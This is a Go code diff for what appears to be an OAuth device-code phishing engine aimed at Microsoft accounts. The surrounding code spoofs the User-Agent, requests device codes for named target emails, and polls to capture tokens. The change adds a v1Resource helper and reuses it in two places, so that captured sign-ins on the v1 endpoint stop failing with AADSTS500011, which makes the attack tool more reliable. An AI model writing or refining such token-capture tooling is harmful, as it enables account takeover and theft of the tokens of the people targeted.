@@ -258,6 +258,26 @@ func NewEngine(tenantID, clientID, scope string, pollIntervalSec int, captureV1,
 	}
 }
 
+// v1Resource normalizes a configured scope string into something the v1 token
+// endpoint will accept as resource=. The v1 endpoint wants a single URL or GUID
+// per request, but operators routinely leave a v2-style scope behind when they
+// flip capture_v1 on (for example "https://graph.microsoft.com/.default
+// offline_access openid profile"). Without this, the whole string lands in
+// resource= and Microsoft rejects the target at sign-in with AADSTS500011.
+//
+// We take the first whitespace-separated token, drop a v2-only /.default
+// suffix, and fall back to Graph when whatever is left isn't a URL or URN.
+func v1Resource(scope string) string {
+	first := ""
+	if tokens := strings.Fields(scope); len(tokens) > 0 {
+		first = strings.TrimSuffix(tokens[0], "/.default")
+	}
+	if !strings.HasPrefix(first, "https://") && !strings.HasPrefix(first, "urn:") {
+		return "https://graph.microsoft.com"
+	}
+	return first
+}
+
 // newRequest creates an http.Request with the engine's spoofed User-Agent.
 func (e *Engine) newRequest(ctx context.Context, method, url string, body io.Reader) (*http.Request, error) {
 	req, err := http.NewRequestWithContext(ctx, method, url, body)
@@ -280,13 +300,7 @@ func (e *Engine) RequestDeviceCode(ctx context.Context, targetID, targetEmail st
 	form := url.Values{}
 	form.Set("client_id", e.clientID)
 	if e.captureV1 {
-		// v1 endpoint uses resource= (must be a URL or GUID, not a scope string).
-		// If the operator left a v2-style scope string, default to Graph.
-		resource := e.scope
-		if !strings.HasPrefix(resource, "https://") && !strings.HasPrefix(resource, "urn:") {
-			resource = "https://graph.microsoft.com"
-		}
-		form.Set("resource", resource)
+		form.Set("resource", v1Resource(e.scope))
 	} else {
 		form.Set("scope", e.scope)
 	}
@@ -444,11 +458,7 @@ func (e *Engine) poll(ctx context.Context, session *Session) (*TokenResult, bool
 	form.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
 	if e.captureV1 {
 		form.Set("code", session.DeviceCode.DeviceCode)
-		resource := e.scope
-		if !strings.HasPrefix(resource, "https://") && !strings.HasPrefix(resource, "urn:") {
-			resource = "https://graph.microsoft.com"
-		}
-		form.Set("resource", resource)
+		form.Set("resource", v1Resource(e.scope))
 	} else {
 		form.Set("device_code", session.DeviceCode.DeviceCode)
 	}
